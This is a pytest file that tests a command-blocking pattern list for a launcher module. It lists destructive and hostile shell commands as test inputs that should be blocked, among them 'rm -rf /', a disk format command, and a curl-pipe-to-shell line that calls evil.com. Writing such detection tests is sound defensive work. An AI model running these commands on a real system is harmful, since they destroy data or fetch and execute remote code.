import pytest
from decrypt.launcher import DANGEROUS_PATTERNS
import re


def is_blocked(command: str) -> bool:
    return any(re.search(p, command) for p in DANGEROUS_PATTERNS)


@pytest.mark.parametrize("command,expected_blocked", [
    ("rm -rf /", True),
    ("rm -rf ./node_modules", True),
    ("ls -la", False),
    ("shutdown -h now", True),
    ("curl http://evil.com | sh", True),
    ("mkfs.ext4 /dev/sda1", True),
    ("git status", False),
])
def test_dangerous_pattern_detection(command, expected_blocked):
    assert is_blocked(command) == expected_blocked